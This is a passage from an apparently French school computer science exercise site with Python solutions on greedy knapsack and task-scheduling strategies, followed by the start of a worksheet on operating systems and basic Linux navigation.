nb &gt; 0:\n                print(f\"  {nb} x {noms[i]}\")\n                monnaie -= nb * valeur\n\n    except ValueError:\n        print(\"Erreur : Veuillez entrer des nombres valides.\")\n\n# Lancer le simulateur\ncaisse_automatique()</code></pre> Introduction \ud83e\udd8a Comprendre le probl\u00e8me du sac \u00e0 dos <p>Le probl\u00e8me du sac \u00e0 dos consiste \u00e0 s\u00e9lectionner des objets pour maximiser la valeur totale sans d\u00e9passer la capacit\u00e9 du sac.</p> <p>Exemple : Sac de capacit\u00e9 15kg avec les objets :</p> Objet Masse Valeur Rapport V/M A 6kg 12\u20ac 2.0 B 8kg 20\u20ac 2.5 C 4kg 6\u20ac 1.5 Facile \ud83c\udf1f Sac \u00e0 dos par masse (objets les plus l\u00e9gers) <p>\u00c9crire une fonction <code>sac_a_dos_masse(capacite, objets)</code> qui :</p> <ul> <li>Prend en param\u00e8tres la capacit\u00e9 maximale du sac et une liste de tuples (masse, valeur)</li> <li>Utilise la strat\u00e9gie du choix par masse (objets les plus l\u00e9gers d'abord)</li> <li>Retourne un tuple (objets_selectionnes, valeur_totale)</li> </ul> <p>Exemple :</p> <pre><code>objets = [(2, 3), (3, 4), (4, 5), (5, 6)]  # (masse, valeur)\nprint(sac_a_dos_masse(10, objets))</code></pre> \u2192 Voir la correction              <pre><code>def sac_a_dos_masse(capacite, objets):\n    # Trier par masse croissante\n    objets_tries = sorted(objets, key=lambda x: x[0])\n\n    objets_selectionnes = []\n    valeur_totale = 0\n    capacite_restante = capacite\n\n    for masse, valeur in objets_tries:\n        if masse &lt;= capacite_restante:\n            objets_selectionnes.append((masse, valeur))\n            valeur_totale += valeur\n            capacite_restante -= masse\n\n    return (objets_selectionnes, valeur_totale)\n\n# Test\nobjets = [(2, 3), (3, 4), (4, 5), (5, 6)]\nresultat = sac_a_dos_masse(10, objets)\nprint(f\"Objets s\u00e9lectionn\u00e9s : {resultat[0]}\")\nprint(f\"Valeur totale : {resultat[1]}\")</code></pre> Facile \ud83c\udf1f Sac \u00e0 dos par valeur (objets les plus pr\u00e9cieux) <p>\u00c9crire une fonction <code>sac_a_dos_valeur(capacite, objets)</code> qui :</p> <ul> <li>Prend en param\u00e8tres la capacit\u00e9 maximale du sac et une liste de tuples (masse, valeur)</li> <li>Utilise la strat\u00e9gie du choix par valeur (objets les plus pr\u00e9cieux d'abord)</li> <li>Retourne un tuple (objets_selectionnes, valeur_totale)</li> </ul> \u2192 Voir la correction              <pre><code>def sac_a_dos_valeur(capacite, objets):\n    # Trier par valeur d\u00e9croissante\n    objets_tries = sorted(objets, key=lambda x: x[1], reverse=True)\n\n    objets_selectionnes = []\n    valeur_totale = 0\n    capacite_restante = capacite\n\n    for masse, valeur in objets_tries:\n        if masse &lt;= capacite_restante:\n            objets_selectionnes.append((masse, valeur))\n            valeur_totale += valeur\n            capacite_restante -= masse\n\n    return (objets_selectionnes, valeur_totale)\n\n# Test\nobjets = [(2, 3), (3, 4), (4, 5), (5, 6)]\nresultat = sac_a_dos_valeur(10, objets)\nprint(f\"Objets s\u00e9lectionn\u00e9s : {resultat[0]}\")\nprint(f\"Valeur totale : {resultat[1]}\")</code></pre> Interm\u00e9diaire \ud83d\udd25 Sac \u00e0 dos par rapport valeur/masse <p>\u00c9crire une fonction <code>sac_a_dos_rapport(capacite, objets)</code> qui :</p> <ul> <li>Utilise la strat\u00e9gie du choix par rapport valeur/masse (efficacit\u00e9)</li> <li>Calcule le rapport valeur/masse pour chaque objet</li> <li>S\u00e9lectionne les objets par ordre d\u00e9croissant de ce rapport</li> <li>Retourne un tuple (objets_selectionnes, valeur_totale)</li> </ul> \u2192 Voir la correction              <pre><code>def sac_a_dos_rapport(capacite, objets):\n    # Calculer le rapport valeur/masse et trier par ordre d\u00e9croissant\n    objets_avec_rapport = [(masse, valeur, valeur/masse) for masse, valeur in objets]\n    objets_tries = sorted(objets_avec_rapport, key=lambda x: x[2], reverse=True)\n\n    objets_selectionnes = []\n    valeur_totale = 0\n    capacite_restante = capacite\n\n    for masse, valeur, rapport in objets_tries:\n        if masse &lt;= capacite_restante:\n            objets_selectionnes.append((masse, valeur))\n            valeur_totale += valeur\n            capacite_restante -= masse\n\n    return (objets_selectionnes, valeur_totale)\n\n# Test\nobjets = [(2, 3), (3, 4), (4, 5), (5, 6)]\nresultat = sac_a_dos_rapport(10, objets)\nprint(f\"Objets s\u00e9lectionn\u00e9s : {resultat[0]}\")\nprint(f\"Valeur totale : {resultat[1]}\")</code></pre> Interm\u00e9diaire \ud83d\udd25 Analyse comparative des strat\u00e9gies <p>Soit un sac \u00e0 dos de capacit\u00e9 15 kg et les objets suivants :</p> Objet 1 2 3 4 5 Masse 6 8 4 10 7 Valeur 12 20 6 18 15 <p>Questions :</p> <ol> <li>Appliquer l'algorithme glouton en utilisant la strat\u00e9gie par masse.</li> <li>Appliquer l'algorithme glouton en utilisant la strat\u00e9gie par valeur.</li> <li>Appliquer l'algorithme glouton en utilisant la strat\u00e9gie par rapport valeur/masse.</li> <li>Quelle strat\u00e9gie donne les meilleurs r\u00e9sultats ?</li> </ol> \u2192 Voir la correction              <pre><code># Donn\u00e9es de l'exercice\nobjets = [(6, 12), (8, 20), (4, 6), (10, 18), (7, 15)]  # (masse, valeur)\ncapacite = 15\n\nprint(\"=== ANALYSE COMPARATIVE DES STRAT\u00c9GIES ===\")\nprint(f\"Capacit\u00e9 du sac : {capacite} kg\")\nprint(f\"Objets disponibles : {objets}\")\nprint()\n\n# 1. Strat\u00e9gie par masse\nprint(\"1. Strat\u00e9gie par masse (objets les plus l\u00e9gers) :\")\nresultat_masse = sac_a_dos_masse(capacite, objets)\nprint(f\"   Objets s\u00e9lectionn\u00e9s : {resultat_masse[0]}\")\nprint(f\"   Valeur totale : {resultat_masse[1]}\")\nprint()\n\n# 2. Strat\u00e9gie par valeur\nprint(\"2. Strat\u00e9gie par valeur (objets les plus pr\u00e9cieux) :\")\nresultat_valeur = sac_a_dos_valeur(capacite, objets)\nprint(f\"   Objets s\u00e9lectionn\u00e9s : {resultat_valeur[0]}\")\nprint(f\"   Valeur totale : {resultat_valeur[1]}\")\nprint()\n\n# 3. Strat\u00e9gie par rapport\nprint(\"3. Strat\u00e9gie par rapport valeur/masse :\")\nresultat_rapport = sac_a_dos_rapport(capacite, objets)\nprint(f\"   Objets s\u00e9lectionn\u00e9s : {resultat_rapport[0]}\")\nprint(f\"   Valeur totale : {resultat_rapport[1]}\")\nprint()\n\n# 4. Comparaison\nprint(\"4. Comparaison des r\u00e9sultats :\")\nstrategies = [\n    (\"Masse\", resultat_masse[1]),\n    (\"Valeur\", resultat_valeur[1]),\n    (\"Rapport V/M\", resultat_rapport[1])\n]\n\nmeilleure = max(strategies, key=lambda x: x[1])\nprint(f\"   Meilleure strat\u00e9gie : {meilleure[0]} avec une valeur de {meilleure[1]}\")</code></pre> Difficile \ud83d\ude80 Optimisation et limites de l'algorithme glouton <p>L'algorithme glouton pour le sac \u00e0 dos ne garantit pas toujours la solution optimale.</p> <p>Exemple probl\u00e9matique : Capacit\u00e9 10kg, objets [(6, 10), (5, 8), (5, 8)]</p> <ul> <li>Algorithme glouton par valeur : prend (6, 10) puis ne peut plus rien ajouter \u2192 valeur = 10</li> <li>Solution optimale : prend (5, 8) et (5, 8) \u2192 valeur = 16</li> </ul> <p>Cr\u00e9er une fonction qui teste diff\u00e9rents cas et identifie quand l'algorithme glouton \u00e9choue.</p> \u2192 Voir la correction              <pre><code>def test_limites_glouton():\n    print(\"=== TEST DES LIMITES DE L'ALGORITHME GLOUTON ===\")\n\n    # Cas probl\u00e9matique 1\n    print(\"\\nCas 1 : Capacit\u00e9 10kg, objets [(6, 10), (5, 8), (5, 8)]\")\n    objets1 = [(6, 10), (5, 8), (5, 8)]\n    capacite1 = 10\n\n    # Strat\u00e9gie par valeur (probl\u00e9matique)\n    resultat_valeur = sac_a_dos_valeur(capacite1, objets1)\n    print(f\"Glouton par valeur : {resultat_valeur[0]}, valeur = {resultat_valeur[1]}\")\n\n    # Solution optimale (force brute simple)\n    print(\"Solution optimale : [(5, 8), (5, 8)], valeur = 16\")\n    print(\"\u2192 L'algorithme glouton \u00e9choue !\")\n\n    # Cas probl\u00e9matique 2\n    print(\"\\nCas 2 : Capacit\u00e9 15kg, objets [(10, 10), (6, 6), (6, 6)]\")\n    objets2 = [(10, 10), (6, 6), (6, 6)]\n    capacite2 = 15\n\n    resultat_valeur2 = sac_a_dos_valeur(capacite2, objets2)\n    print(f\"Glouton par valeur : {resultat_valeur2[0]}, valeur = {resultat_valeur2[1]}\")\n    print(\"Solution optimale : [(6, 6), (6, 6)], valeur = 12\")\n\n    if resultat_valeur2[1] &gt;= 12:\n        print(\"\u2192 L'algorithme glouton fonctionne bien ici\")\n    else:\n        print(\"\u2192 L'algorithme glouton \u00e9choue !\")\n\n    print(\"\\nConclusion : L'algorithme glouton est rapide mais pas toujours optimal.\")\n    print(\"Pour une solution optimale, il faut utiliser la programmation dynamique.\")\n\n# Lancer le test\ntest_limites_glouton()</code></pre> Introduction \ud83e\udd8a Comprendre la planification de t\u00e2ches <p>Le probl\u00e8me de la planification de t\u00e2ches consiste \u00e0 ordonnancer des t\u00e2ches pour minimiser le retard total ou maximiser le nombre de t\u00e2ches termin\u00e9es \u00e0 temps.</p> <p>Exemple : 4 t\u00e2ches avec leurs dur\u00e9es et \u00e9ch\u00e9ances :</p> T\u00e2che Dur\u00e9e \u00c9ch\u00e9ance A 3h 6h B 2h 8h C 1h 9h D 4h 9h <p>Strat\u00e9gie gloutonne : Trier les t\u00e2ches par \u00e9ch\u00e9ance croissante (EDD - Earliest Due Date).</p> Facile \ud83c\udf1f Planification par \u00e9ch\u00e9ance (EDD) <p>\u00c9crire une fonction <code>planification_echeance(taches)</code> qui :</p> <ul> <li>Prend en param\u00e8tre une liste de tuples (nom, duree, echeance)</li> <li>Utilise la strat\u00e9gie EDD (Earliest Due Date)</li> <li>Retourne l'ordre d'ex\u00e9cution des t\u00e2ches</li> </ul> <p>Exemple :</p> <pre><code>taches = [(\"A\", 3, 6), (\"B\", 2, 8), (\"C\", 1, 9), (\"D\", 4, 9)]\nprint(planification_echeance(taches))</code></pre> \u2192 Voir la correction              <pre><code>def planification_echeance(taches):\n    # Trier par \u00e9ch\u00e9ance croissante (EDD)\n    taches_triees = sorted(taches, key=lambda x: x[2])\n\n    ordre_execution = []\n    temps_actuel = 0\n\n    for nom, duree, echeance in taches_triees:\n        ordre_execution.append({\n            'nom': nom,\n            'debut': temps_actuel,\n            'fin': temps_actuel + duree,\n            'echeance': echeance,\n            'retard': max(0, temps_actuel + duree - echeance)\n        })\n        temps_actuel += duree\n\n    return ordre_execution\n\n# Test\ntaches = [(\"A\", 3, 6), (\"B\", 2, 8), (\"C\", 1, 9), (\"D\", 4, 9)]\nresultat = planification_echeance(taches)\n\nprint(\"Ordre d'ex\u00e9cution (strat\u00e9gie EDD) :\")\nfor tache in resultat:\n    print(f\"T\u00e2che {tache['nom']} : {tache['debut']}h \u2192 {tache['fin']}h (\u00e9ch\u00e9ance: {tache['echeance']}h, retard: {tache['retard']}h)\")</code></pre> Facile \ud83c\udf1f Planification par dur\u00e9e (SPT) <p>\u00c9crire une fonction <code>planification_duree(taches)</code> qui :</p> <ul> <li>Utilise la strat\u00e9gie SPT (Shortest Processing Time)</li> <li>Trie les t\u00e2ches par dur\u00e9e croissante</li> <li>Calcule le temps de completion moyen</li> </ul> \u2192 Voir la correction              <pre><code>def planification_duree(taches):\n    # Trier par dur\u00e9e croissante (SPT)\n    taches_triees = sorted(taches, key=lambda x: x[1])\n\n    ordre_execution = []\n    temps_actuel = 0\n    temps_completion_total = 0\n\n    for nom, duree, echeance in taches_triees:\n        temps_completion = temps_actuel + duree\n        temps_completion_total += temps_completion\n\n        ordre_execution.append({\n            'nom': nom,\n            'debut': temps_actuel,\n            'fin': temps_completion,\n            'echeance': echeance,\n            'retard': max(0, temps_completion - echeance)\n        })\n        temps_actuel += duree\n\n    temps_completion_moyen = temps_completion_total / len(taches)\n\n    return ordre_execution, temps_completion_moyen\n\n# Test\ntaches = [(\"A\", 3, 6), (\"B\", 2, 8), (\"C\", 1, 9), (\"D\", 4, 9)]\nresultat, temps_moyen = planification_duree(taches)\n\nprint(\"Ordre d'ex\u00e9cution (strat\u00e9gie SPT) :\")\nfor tache in resultat:\n    print(f\"T\u00e2che {tache['nom']} : {tache['debut']}h \u2192 {tache['fin']}h (\u00e9ch\u00e9ance: {tache['echeance']}h, retard: {tache['retard']}h)\")\nprint(f\"\\nTemps de completion moyen : {temps_moyen:.1f}h\")</code></pre> Interm\u00e9diaire \ud83d\udd25 Comparaison des strat\u00e9gies de planification <p>Soit les t\u00e2ches suivantes :</p> T\u00e2che T1 T2 T3 T4 T5 Dur\u00e9e 4h 2h 6h 3h 1h \u00c9ch\u00e9ance 8h 4h 12h 6h 3h <p>Questions :</p> <ol> <li>Appliquer la strat\u00e9gie EDD (par \u00e9ch\u00e9ance)</li> <li>Appliquer la strat\u00e9gie SPT (par dur\u00e9e)</li> <li>Calculer le retard total pour chaque strat\u00e9gie</li> <li>Quelle strat\u00e9gie minimise le retard total ?</li> </ol> \u2192 Voir la correction              <pre><code># Donn\u00e9es de l'exercice\ntaches = [(\"T1\", 4, 8), (\"T2\", 2, 4), (\"T3\", 6, 12), (\"T4\", 3, 6), (\"T5\", 1, 3)]\n\nprint(\"=== COMPARAISON DES STRAT\u00c9GIES DE PLANIFICATION ===\")\nprint(f\"T\u00e2ches : {taches}\")\nprint()\n\n# 1. Strat\u00e9gie EDD\nprint(\"1. Strat\u00e9gie EDD (Earliest Due Date) :\")\nresultat_edd = planification_echeance(taches)\nretard_total_edd = sum(tache['retard'] for tache in resultat_edd)\nprint(\"   Ordre : \", [tache['nom'] for tache in resultat_edd])\nfor tache in resultat_edd:\n    print(f\"   {tache['nom']} : {tache['debut']}h \u2192 {tache['fin']}h (retard: {tache['retard']}h)\")\nprint(f\"   Retard total : {retard_total_edd}h\")\nprint()\n\n# 2. Strat\u00e9gie SPT\nprint(\"2. Strat\u00e9gie SPT (Shortest Processing Time) :\")\nresultat_spt, temps_moyen = planification_duree(taches)\nretard_total_spt = sum(tache['retard'] for tache in resultat_spt)\nprint(\"   Ordre : \", [tache['nom'] for tache in resultat_spt])\nfor tache in resultat_spt:\n    print(f\"   {tache['nom']} : {tache['debut']}h \u2192 {tache['fin']}h (retard: {tache['retard']}h)\")\nprint(f\"   Retard total : {retard_total_spt}h\")\nprint(f\"   Temps completion moyen : {temps_moyen:.1f}h\")\nprint()\n\n# 3. Comparaison\nprint(\"3. Comparaison des r\u00e9sultats :\")\nprint(f\"   EDD - Retard total : {retard_total_edd}h\")\nprint(f\"   SPT - Retard total : {retard_total_spt}h\")\n\nif retard_total_edd &lt; retard_total_spt:\n    print(\"   \u2192 EDD minimise mieux le retard total\")\nelif retard_total_spt &lt; retard_total_edd:\n    print(\"   \u2192 SPT minimise mieux le retard total\")\nelse:\n    print(\"   \u2192 Les deux strat\u00e9gies donnent le m\u00eame retard total\")</code></pre> Interm\u00e9diaire \ud83d\udd25 Planification avec priorit\u00e9s <p>Cr\u00e9er une fonction <code>planification_priorite(taches)</code> qui :</p> <ul> <li>Prend en param\u00e8tre une liste de tuples (nom, duree, echeance, priorite)</li> <li>Utilise un syst\u00e8me de score combinant \u00e9ch\u00e9ance et priorit\u00e9</li> <li>Score = priorit\u00e9 / \u00e9ch\u00e9ance (plus le score est \u00e9lev\u00e9, plus urgent)</li> <li>Retourne l'ordre d'ex\u00e9cution optimis\u00e9</li> </ul> <p>Exemple : Priorit\u00e9 de 1 (faible) \u00e0 5 (critique)</p> \u2192 Voir la correction              <pre><code>def planification_priorite(taches):\n    # Calculer le score d'urgence : priorit\u00e9 / \u00e9ch\u00e9ance\n    taches_avec_score = []\n    for nom, duree, echeance, priorite in taches:\n        score = priorite / echeance\n        taches_avec_score.append((nom, duree, echeance, priorite, score))\n\n    # Trier par score d\u00e9croissant (plus urgent en premier)\n    taches_triees = sorted(taches_avec_score, key=lambda x: x[4], reverse=True)\n\n    ordre_execution = []\n    temps_actuel = 0\n\n    for nom, duree, echeance, priorite, score in taches_triees:\n        ordre_execution.append({\n            'nom': nom,\n            'debut': temps_actuel,\n            'fin': temps_actuel + duree,\n            'echeance': echeance,\n            'priorite': priorite,\n            'score': score,\n            'retard': max(0, temps_actuel + duree - echeance)\n        })\n        temps_actuel += duree\n\n    return ordre_execution\n\n# Test\ntaches = [\n    (\"Rapport\", 3, 8, 4),      # (nom, dur\u00e9e, \u00e9ch\u00e9ance, priorit\u00e9)\n    (\"Email\", 1, 2, 2),\n    (\"Pr\u00e9sentation\", 4, 10, 5),\n    (\"R\u00e9union\", 2, 6, 3),\n    (\"Documentation\", 2, 12, 1)\n]\n\nresultat = planification_priorite(taches)\n\nprint(\"Planification avec priorit\u00e9s :\")\nprint(\"Ordre d'ex\u00e9cution (par score d'urgence) :\")\nfor tache in resultat:\n    print(f\"{tache['nom']} : {tache['debut']}h \u2192 {tache['fin']}h\")\n    print(f\"   Priorit\u00e9: {tache['priorite']}, \u00c9ch\u00e9ance: {tache['echeance']}h, Score: {tache['score']:.2f}\")\n    print(f\"   Retard: {tache['retard']}h\")\n    print()</code></pre> Difficile \ud83d\ude80 Optimisation multi-crit\u00e8res <p>Cr\u00e9er un syst\u00e8me de planification avanc\u00e9 qui :</p> <ul> <li>Combine plusieurs crit\u00e8res : dur\u00e9e, \u00e9ch\u00e9ance, priorit\u00e9, co\u00fbt de retard</li> <li>Utilise une fonction de score pond\u00e9r\u00e9e</li> <li>Permet d'ajuster les poids selon le contexte</li> <li>Compare les r\u00e9sultats avec les strat\u00e9gies simples</li> </ul> <p>Formule : Score = (w1\u00d7priorit\u00e9 + w2\u00d7(1/dur\u00e9e) + w3\u00d7(1/\u00e9ch\u00e9ance) + w4\u00d7co\u00fbt_retard)</p> \u2192 Voir la correction              <pre><code>def planification_multi_criteres(taches, poids=(0.3, 0.2, 0.3, 0.2)):\n    \"\"\"\n    Planification multi-crit\u00e8res avec pond\u00e9ration\n    poids = (w_priorite, w_duree, w_echeance, w_cout_retard)\n    \"\"\"\n    w_priorite, w_duree, w_echeance, w_cout_retard = poids\n\n    taches_avec_score = []\n    for nom, duree, echeance, priorite, cout_retard in taches:\n        # Normalisation des crit\u00e8res (plus c'est \u00e9lev\u00e9, plus c'est urgent)\n        score_priorite = priorite  # 1-5\n        score_duree = 1 / duree if duree &gt; 0 else 0  # Favorise les t\u00e2ches courtes\n        score_echeance = 1 / echeance if echeance &gt; 0 else 0  # Favorise les \u00e9ch\u00e9ances proches\n        score_cout = cout_retard  # Co\u00fbt du retard\n\n        # Score pond\u00e9r\u00e9\n        score_total = (w_priorite * score_priorite + \n                      w_duree * score_duree * 10 +  # Facteur 10 pour \u00e9quilibrer\n                      w_echeance * score_echeance * 100 +  # Facteur 100 pour \u00e9quilibrer\n                      w_cout_retard * score_cout)\n\n        taches_avec_score.append((nom, duree, echeance, priorite, cout_retard, score_total))\n\n    # Trier par score d\u00e9croissant\n    taches_triees = sorted(taches_avec_score, key=lambda x: x[5], reverse=True)\n\n    ordre_execution = []\n    temps_actuel = 0\n    cout_total_retard = 0\n\n    for nom, duree, echeance, priorite, cout_retard, score in taches_triees:\n        fin_tache = temps_actuel + duree\n        retard = max(0, fin_tache - echeance)\n        cout_retard_reel = retard * cout_retard if retard &gt; 0 else 0\n        cout_total_retard += cout_retard_reel\n\n        ordre_execution.append({\n            'nom': nom,\n            'debut': temps_actuel,\n            'fin': fin_tache,\n            'echeance': echeance,\n            'priorite': priorite,\n            'retard': retard,\n            'cout_retard': cout_retard_reel,\n            'score': score\n        })\n        temps_actuel += duree\n\n    return ordre_execution, cout_total_retard\n\n# Test avec donn\u00e9es complexes\ntaches_complexes = [\n    # (nom, dur\u00e9e, \u00e9ch\u00e9ance, priorit\u00e9, co\u00fbt_retard_par_heure)\n    (\"Projet_A\", 5, 10, 5, 50),\n    (\"Maintenance\", 2, 6, 2, 10),\n    (\"Formation\", 3, 15, 3, 5),\n    (\"Urgence\", 1, 3, 5, 100),\n    (\"Routine\", 4, 20, 1, 2)\n]\n\nprint(\"=== PLANIFICATION MULTI-CRIT\u00c8RES ===\")\n\n# Test avec diff\u00e9rents poids\nconfigs = [\n    ((0.4, 0.2, 0.2, 0.2), \"Priorit\u00e9 \u00e9lev\u00e9e\"),\n    ((0.2, 0.4, 0.2, 0.2), \"Dur\u00e9e courte\"),\n    ((0.2, 0.2, 0.4, 0.2), \"\u00c9ch\u00e9ance proche\"),\n    ((0.2, 0.2, 0.2, 0.4), \"Co\u00fbt de retard\")\n]\n\nfor poids, description in configs:\n    print(f\"\\n--- Configuration : {description} ---\")\n    resultat, cout_total = planification_multi_criteres(taches_complexes, poids)\n\n    print(\"Ordre d'ex\u00e9cution :\")\n    for tache in resultat:\n        print(f\"  {tache['nom']} : {tache['debut']}h \u2192 {tache['fin']}h\")\n        print(f\"    Retard: {tache['retard']}h, Co\u00fbt: {tache['cout_retard']:.0f}\u20ac\")\n\n    print(f\"Co\u00fbt total de retard : {cout_total:.0f}\u20ac\")</code></pre> Projet \ud83c\udfaf Simulateur de planification de t\u00e2ches <p>Cr\u00e9er un simulateur complet qui :</p> <ul> <li>Permet de saisir des t\u00e2ches avec tous leurs attributs</li> <li>Propose plusieurs strat\u00e9gies de planification</li> <li>Affiche un planning visuel (diagramme de Gantt textuel)</li> <li>Compare les performances de chaque strat\u00e9gie</li> <li>G\u00e9n\u00e8re un rapport d'analyse</li> </ul> <p>Fonctionnalit\u00e9s : Interface interactive, visualisation, export des r\u00e9sultats</p> \u2192 Voir la correction              <pre><code>class SimulateurPlanification:\n    def __init__(self):\n        self.taches = []\n        self.strategies = {\n            'EDD': self.planification_edd,\n            'SPT': self.planification_spt,\n            'Priorit\u00e9': self.planification_priorite,\n            'Multi-crit\u00e8res': self.planification_multi\n        }\n\n    def ajouter_tache(self, nom, duree, echeance, priorite=1, cout_retard=0):\n        self.taches.append({\n            'nom': nom,\n            'duree': duree,\n            'echeance': echeance,\n            'priorite': priorite,\n            'cout_retard': cout_retard\n        })\n\n    def planification_edd(self):\n        return sorted(self.taches, key=lambda x: x['echeance'])\n\n    def planification_spt(self):\n        return sorted(self.taches, key=lambda x: x['duree'])\n\n    def planification_priorite(self):\n        return sorted(self.taches, key=lambda x: x['priorite'], reverse=True)\n\n    def planification_multi(self):\n        taches_scorees = []\n        for tache in self.taches:\n            score = (tache['priorite'] * 0.3 + \n                    (1/tache['duree']) * 2 + \n                    (1/tache['echeance']) * 10 + \n                    tache['cout_retard'] * 0.1)\n            taches_scorees.append((tache, score))\n\n        return [t[0] for t in sorted(taches_scorees, key=lambda x: x[1], reverse=True)]\n\n    def calculer_metriques(self, ordre):\n        temps_actuel = 0\n        retard_total = 0\n        cout_total = 0\n        taches_a_temps = 0\n\n        for tache in ordre:\n            fin = temps_actuel + tache['duree']\n            retard = max(0, fin - tache['echeance'])\n\n            if retard == 0:\n                taches_a_temps += 1\n\n            retard_total += retard\n            cout_total += retard * tache['cout_retard']\n            temps_actuel = fin\n\n        return {\n            'retard_total': retard_total,\n            'cout_total': cout_total,\n            'taches_a_temps': taches_a_temps,\n            'duree_totale': temps_actuel,\n            'taux_reussite': taches_a_temps / len(ordre) * 100\n        }\n\n    def afficher_gantt(self, ordre, nom_strategie):\n        print(f\"\\n=== DIAGRAMME DE GANTT - {nom_strategie} ===\")\n        temps_actuel = 0\n\n        for tache in ordre:\n            fin = temps_actuel + tache['duree']\n            retard = max(0, fin - tache['echeance'])\n\n            # Barre de progression textuelle\n            barre = \"\u2588\" * tache['duree']\n            statut = \"\u26a0\ufe0f\" if retard &gt; 0 else \"\u2705\"\n\n            print(f\"{tache['nom']:12} |{temps_actuel:2}h {barre:10} {fin:2}h| {statut} (\u00e9ch\u00e9ance: {tache['echeance']}h)\")\n            temps_actuel = fin\n\n    def comparer_strategies(self):\n        print(\"\\n\" + \"=\"*60)\n        print(\"           COMPARAISON DES STRAT\u00c9GIES\")\n        print(\"=\"*60)\n\n        resultats = {}\n\n        for nom, strategie in self.strategies.items():\n            ordre = strategie()\n            metriques = self.calculer_metriques(ordre)\n            resultats[nom] = metriques\n\n            self.afficher_gantt(ordre, nom)\n\n            print(f\"\\nM\u00e9triques pour {nom} :\")\n            print(f\"  Retard total: {metriques['retard_total']}h\")\n            print(f\"  Co\u00fbt total: {metriques['cout_total']:.0f}\u20ac\")\n            print(f\"  T\u00e2ches \u00e0 temps: {metriques['taches_a_temps']}/{len(self.taches)}\")\n            print(f\"  Taux de r\u00e9ussite: {metriques['taux_reussite']:.1f}%\")\n            print(f\"  Dur\u00e9e totale: {metriques['duree_totale']}h\")\n\n        # Recommandation\n        print(\"\\n\" + \"=\"*60)\n        print(\"                RECOMMANDATION\")\n        print(\"=\"*60)\n\n        meilleure_retard = min(resultats.items(), key=lambda x: x[1]['retard_total'])\n        meilleure_cout = min(resultats.items(), key=lambda x: x[1]['cout_total'])\n        meilleur_taux = max(resultats.items(), key=lambda x: x[1]['taux_reussite'])\n\n        print(f\"Meilleure pour minimiser le retard: {meilleure_retard[0]}\")\n        print(f\"Meilleure pour minimiser les co\u00fbts: {meilleure_cout[0]}\")\n        print(f\"Meilleure pour le taux de r\u00e9ussite: {meilleur_taux[0]}\")\n\n# Exemple d'utilisation\nsimulateur = SimulateurPlanification()\n\n# Ajouter des t\u00e2ches\nsimulateur.ajouter_tache(\"D\u00e9veloppement\", 8, 12, 4, 25)\nsimulateur.ajouter_tache(\"Tests\", 3, 10, 3, 15)\nsimulateur.ajouter_tache(\"Documentation\", 2, 15, 2, 5)\nsimulateur.ajouter_tache(\"D\u00e9ploiement\", 1, 8, 5, 50)\nsimulateur.ajouter_tache(\"Formation\", 4, 20, 1, 10)\n\n# Lancer la comparaison\nsimulateur.comparer_strategies()</code></pre>"},{"location":"premiere/VIII-Systemes_d_exploitation_et_Linux/Fiche_exercices_systemes_linux/","title":"Fiche d'exercices : Syst\u00e8mes d'exploitation et Linux","text":""},{"location":"premiere/VIII-Systemes_d_exploitation_et_Linux/Fiche_exercices_systemes_linux/#partie-1-concepts-fondamentaux-des-systemes-dexploitation","title":"\ud83d\udcda Partie 1 : Concepts fondamentaux des syst\u00e8mes d'exploitation","text":"Introduction \ud83e\udd8a Exercice 1 - R\u00f4les du syst\u00e8me d'exploitation Associez chaque fonction \u00e0 son r\u00f4le dans le syst\u00e8me d'exploitation : Fonctions :             1. Gestion de la m\u00e9moire             2. Ordonnancement des processus             3. Gestion des fichiers             4. Interface utilisateur             5. Gestion des p\u00e9riph\u00e9riques R\u00f4les :             A. Permettre l'interaction avec l'utilisateur             B. Organiser et stocker les donn\u00e9es             C. Allouer la RAM aux programmes             D. D\u00e9cider quel programme s'ex\u00e9cute             E. Contr\u00f4ler imprimantes, clavier, souris          \u2192 Voir la correction          Associations correctes :                 1. Gestion de la m\u00e9moire \u2192 C. Allouer la RAM aux programmes                 2. Ordonnancement des processus \u2192 D. D\u00e9cider quel programme s'ex\u00e9cute                 3. Gestion des fichiers \u2192 B. Organiser et stocker les donn\u00e9es                 4. Interface utilisateur \u2192 A. Permettre l'interaction avec l'utilisateur                 5. Gestion des p\u00e9riph\u00e9riques \u2192 E. Contr\u00f4ler imprimantes, clavier, souris              Introduction \ud83e\udd8a Exercice 2 - Types de syst\u00e8mes d'exploitation Classez ces syst\u00e8mes d'exploitation par cat\u00e9gorie : Syst\u00e8mes : Windows 11, Ubuntu, macOS, Android, iOS, CentOS, Debian, FreeBSD Cat\u00e9gories :             1. Syst\u00e8mes propri\u00e9taires             2. Syst\u00e8mes open source             3. Syst\u00e8mes mobiles             4. Syst\u00e8mes serveur          \u2192 Voir la correction          Classification :                 1. Propri\u00e9taires : Windows 11, macOS, iOS                 2. Open source : Ubuntu, CentOS, Debian, FreeBSD                 3. Mobiles : Android, iOS                 4. Serveur : CentOS, Debian, Ubuntu Server, FreeBSD Note : Certains syst\u00e8mes peuvent appartenir \u00e0 plusieurs cat\u00e9gories Moyen \ud83e\udd8a\ud83e\udd8a Exercice 3 - Processus et threads Analysez cette situation :             Un navigateur web a ouvert 3 onglets :             \u2022 Onglet 1 : YouTube (vid\u00e9o en cours)             \u2022 Onglet 2 : Gmail (lecture d'emails)             \u2022 Onglet 3 : Google Docs (\u00e9dition de document) Questions :             1. Combien de processus sont cr\u00e9\u00e9s ?             2. Quels sont les avantages de cette architecture ?             3. Que se passe-t-il si l'onglet YouTube plante ?             4. Comment le syst\u00e8me g\u00e8re-t-il les priorit\u00e9s ?          \u2192 Voir la correction          Analyse :                 1. Processus : G\u00e9n\u00e9ralement 4 processus (1 principal + 3 pour les onglets)                 2. Avantages :                    \u2022 Isolation : un onglet qui plante n'affecte pas les autres                    \u2022 S\u00e9curit\u00e9 : s\u00e9paration des contextes                    \u2022 Performance : parall\u00e9lisation possible                 3. Si YouTube plante : Seul cet onglet se ferme, les autres continuent                 4. Priorit\u00e9s : L'onglet actif a plus de CPU, les onglets en arri\u00e8re-plan sont limit\u00e9s"},{"location":"premiere/VIII-Systemes_d_exploitation_et_Linux/Fiche_exercices_systemes_linux/#partie-2-commandes-linux-de-base","title":"\ud83d\udcda Partie 2 : Commandes Linux de base","text":"Introduction \ud83e\udd8a Exercice 4 - Navigation dans les r\u00e9pertoires Vous \u00eates dans le r\u00e9pertoire /home/user. \u00c9crivez les commandes pour :             1. Afficher le r\u00e9pertoire courant             2. Lister le contenu du r\u00e9pertoire             3. Aller dans le r\u00e9pertoire Documents             4. Revenir au r\u00e9pertoire parent             5. Aller directement \u00e0 la racine             6. Retourner au r\u00e9pertoire home de 